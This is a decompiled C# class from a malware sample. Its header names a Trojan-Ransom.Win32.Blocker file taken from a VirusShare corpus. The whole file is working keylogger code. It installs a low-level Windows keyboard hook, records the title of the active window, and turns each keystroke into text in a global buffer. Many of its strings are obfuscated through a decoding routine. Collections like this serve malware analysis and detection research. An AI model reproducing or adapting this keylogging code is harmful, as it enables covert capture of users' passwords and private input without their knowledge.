// Decompiled with JetBrains decompiler
// Type: XNNKMUW
// Assembly: ServerPHP, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 6F25B3EA-9C2B-406D-A5C7-3B7C6942C4C5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.kwu-cbd4f8ac3865079e515f22b836eb2d279bf8687da866b97896c91bd38f105d09.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class XNNKMUW
{
  private string output;
  private static IntPtr CKBRMSLK = (IntPtr) 0;
  private static string UTOJDOLJ = "";
  private static XNNKMUW.KeyboardHookDelegate SNKQDGT = (XNNKMUW.KeyboardHookDelegate) null;

  public static string SUJFRQW(IntPtr hWnd)
  {
    string str;
    try
    {
      if (hWnd.ToInt32() <= 0)
      {
        str = (string) null;
      }
      else
      {
        int windowTextLength = XNNKMUW.GetWindowTextLength(hWnd);
        if (windowTextLength == 0)
        {
          str = (string) null;
        }
        else
        {
          StringBuilder lpString = new StringBuilder(checked (windowTextLength + 1));
          XNNKMUW.GetWindowText((int) hWnd, lpString, lpString.Capacity);
          str = lpString.ToString().Trim();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static bool UGWUEDC()
  {
    bool flag;
    try
    {
      flag = XNNKMUW.CKBRMSLK != (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void PYEWXKY()
  {
    try
    {
      XNNKMUW.SNKQDGT = new XNNKMUW.KeyboardHookDelegate(XNNKMUW.KYBRDLCK);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      XNNKMUW.CKBRMSLK = (IntPtr) XNNKMUW.SetWindowsHookEx(13, XNNKMUW.SNKQDGT, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void QPNRCIRS()
  {
    try
    {
      if (!XNNKMUW.UGWUEDC() || XNNKMUW.UnhookWindowsHookEx((int) XNNKMUW.CKBRMSLK) == 0)
        return;
      XNNKMUW.CKBRMSLK = (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UnhookWindowsHookEx(int hHook);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetAsyncKeyState(int vKey);

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    XNNKMUW.KeyboardHookDelegate lpfn,
    int hmod,
    int dwThreadId);

  public static int KYBRDLCK(int Code, int WPA, ref XNNKMUW.GGCPMIP LPA)
  {
    try
    {
      string Left = XNNKMUW.SUJFRQW(XNNKMUW.GetForegroundWindow());
      if (Operators.CompareString(Left, XNNKMUW.UTOJDOLJ, false) != 0)
      {
        XNNKMUW.UTOJDOLJ = Left;
        LOIFDUM.MHGSSER = LOIFDUM.MHGSSER + Environment.NewLine + EHMIWRQ.VIJVUUV("n5mXnpBxjAQ=", "False") + " " + Left + " " + EHMIWRQ.VIJVUUV("aIOOlYd1sw0=", "False") + Environment.NewLine + Environment.NewLine;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Thread.Sleep(10);
      string str = "";
      if (WPA == 256 | WPA == 260)
      {
        switch (LPA.BLCNOWM)
        {
          case 8:
            LOIFDUM.MHGSSER = LOIFDUM.MHGSSER.Substring(0, checked (LOIFDUM.MHGSSER.Length - 1));
            break;
          case 9:
            str = char.ConvertFromUtf32(9);
            break;
          case 13:
            str = Environment.NewLine;
            break;
          case 16:
          case 160:
          case 161:
            str = "";
            break;
          case 18:
            str = EHMIWRQ.VIJVUUV("W7Gi1M6Ydg0=", "False");
            break;
          case 20:
            str = !Control.IsKeyLocked(Keys.Capital) ? EHMIWRQ.VIJVUUV("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : EHMIWRQ.VIJVUUV("QpiLkJF1XZSehG1dl5WHf10m", "False");
            break;
          case 27:
            str = EHMIWRQ.VIJVUUV("S6GWy62IZh0=", "False");
            break;
          case 32:
            str = EHMIWRQ.VIJVUUV("RyA=", "False");
            break;
          case 33:
            str = EHMIWRQ.VIJVUUV("Zbu708uqtdvPhAE=", "False");
            break;
          case 34:
            str = EHMIWRQ.VIJVUUV("VKqqwrqZk8nYwZFvFA==", "False");
            break;
          case 35:
            str = EHMIWRQ.VIJVUUV("R52SwqqEYiE=", "False");
            break;
          case 36:
            str = EHMIWRQ.VIJVUUV("WrCo1safsoAP", "False");
            break;
          case 37:
            str = EHMIWRQ.VIJVUUV("U6mVvXIT", "False");
            break;
          case 38:
            str = EHMIWRQ.VIJVUUV("SJ6ssmce", "False");
            break;
          case 39:
            str = EHMIWRQ.VIJVUUV("X7WjyX4H", "False");
            break;
          case 40:
            str = EHMIWRQ.VIJVUUV("O5GXpVor", "False");
            break;
          case 46:
            str = EHMIWRQ.VIJVUUV("WrCkzMWXdQ4=", "False");
            break;
          case 48:
          case 49:
          case 50:
          case 51:
          case 52:
          case 53:
          case 54:
          case 55:
          case 56:
          case 57:
            if (MyProject.Computer.Keyboard.ShiftKeyDown)
            {
              string[] strArray = EHMIWRQ.VIJVUUV("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False").Split(Conversions.ToChar(EHMIWRQ.VIJVUUV("VBM=", "False")));
              switch (LPA.BLCNOWM)
              {
                case 48:
                  str = strArray[9];
                  break;
                case 49:
                  str = strArray[0];
                  break;
                case 50:
                  str = strArray[1];
                  break;
                case 51:
                  str = strArray[2];
                  break;
                case 52:
                  str = strArray[3];
                  break;
                case 53:
                  str = strArray[4];
                  break;
                case 54:
                  str = strArray[5];
                  break;
                case 55:
                  str = strArray[6];
                  break;
                case 56:
                  str = strArray[7];
                  break;
                case 57:
                  str = strArray[8];
                  break;
              }
            }
            else
            {
              str = char.ConvertFromUtf32(LPA.BLCNOWM);
              break;
            }
            break;
          case 65:
          case 66:
          case 67:
          case 68:
          case 69:
          case 70:
          case 71:
          case 72:
          case 73:
          case 74:
          case 75:
          case 76:
          case 77:
          case 78:
          case 79:
          case 80:
          case 81:
          case 82:
          case 83:
          case 84:
          case 85:
          case 86:
          case 87:
          case 88:
          case 89:
          case 90:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (LPA.BLCNOWM + 32)).ToLower() : char.ConvertFromUtf32(checked (LPA.BLCNOWM + 32)).ToUpper();
            break;
          case 91:
          case 92:
            str = EHMIWRQ.VIJVUUV("Q5mgubBls73EsZGbaSY=", "False");
            break;
          case 96:
            str = EHMIWRQ.VIJVUUV("dQI=", "False");
            break;
          case 97:
            str = EHMIWRQ.VIJVUUV("Wx0=", "False");
            break;
          case 98:
            str = EHMIWRQ.VIJVUUV("ZhM=", "False");
            break;
          case 99:
            str = EHMIWRQ.VIJVUUV("SjA=", "False");
            break;
          case 100:
            str = EHMIWRQ.VIJVUUV("TC8=", "False");
            break;
          case 101:
            str = EHMIWRQ.VIJVUUV("VCg=", "False");
            break;
          case 102:
            str = EHMIWRQ.VIJVUUV("WyI=", "False");
            break;
          case 103:
            str = EHMIWRQ.VIJVUUV("dQk=", "False");
            break;
          case 104:
            str = EHMIWRQ.VIJVUUV("Vyg=", "False");
            break;
          case 105:
            str = EHMIWRQ.VIJVUUV("dwk=", "False");
            break;
          case 112:
          case 113:
          case 114:
          case 115:
          case 116:
          case 117:
          case 118:
          case 119:
          case 120:
          case 121:
          case 122:
          case 123:
          case 124:
          case 125:
          case 126:
          case (int) sbyte.MaxValue:
          case 128:
          case 129:
          case 130:
          case 131:
          case 132:
          case 133:
          case 134:
          case 135:
            str = EHMIWRQ.VIJVUUV("UaedGA==", "False") + Conversions.ToString(checked (LPA.BLCNOWM - 111)) + EHMIWRQ.VIJVUUV("o4EC", "False");
            break;
          case 144:
            str = !MyProject.Computer.Keyboard.NumLock ? EHMIWRQ.VIJVUUV("ZLq45tCQzs3cg5PNx5EG", "False") : EHMIWRQ.VIJVUUV("SZ+dy7V1s7LBaHiqtbNoHQ==", "False");
            break;
          case 162:
          case 163:
            str = EHMIWRQ.VIJVUUV("Vaue0cKpwsrOsVUS", "False");
            break;
          case 164:
          case 165:
            str = EHMIWRQ.VIJVUUV("RJqLvbeBXyQ=", "False");
            break;
          case 186:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("cBI=", "False") : EHMIWRQ.VIJVUUV("axY=", "False");
            break;
          case 187:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("WSs=", "False") : EHMIWRQ.VIJVUUV("bAY=", "False");
            break;
          case 188:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("YhE=", "False") : EHMIWRQ.VIJVUUV("XCc=", "False");
            break;
          case 189:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("cAQ=", "False") : EHMIWRQ.VIJVUUV("eC4=", "False");
            break;
          case 190:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("ZRA=", "False") : EHMIWRQ.VIJVUUV("bRg=", "False");
            break;
          case 191:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("aQ0=", "False") : EHMIWRQ.VIJVUUV("gQU=", "False");
            break;
          case 192:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("lBM=", "False") : EHMIWRQ.VIJVUUV("vQg=", "False");
            break;
          case 219:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("mgg=", "False") : EHMIWRQ.VIJVUUV("wAI=", "False");
            break;
          case 220:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("czA=", "False") : EHMIWRQ.VIJVUUV("vwQ=", "False");
            break;
          case 221:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("gSM=", "False") : EHMIWRQ.VIJVUUV("rBg=", "False");
            break;
          case 222:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? EHMIWRQ.VIJVUUV("bQE=", "False") : EHMIWRQ.VIJVUUV("Ths=", "False");
            break;
          default:
            str = "";
            break;
        }
        LOIFDUM.MHGSSER += str;
        LOIFDUM.WEWRTGQP = LOIFDUM.MHGSSER;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    int num;
    return num;
  }

  [DllImport("user32.dll", SetLastError = true)]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern int GetWindowTextLength(IntPtr hwnd);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

  public XNNKMUW(string output)
  {
    try
    {
      this.output = output;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private delegate int KeyboardHookDelegate(int Code, int wParam, ref XNNKMUW.GGCPMIP lParam);

  public struct GGCPMIP
  {
    public int BLCNOWM;
    public int GYILXLT;
    public int DGUCGCG;
    public int KRPWTQS;
    public int YHIPXXS;
  }
}
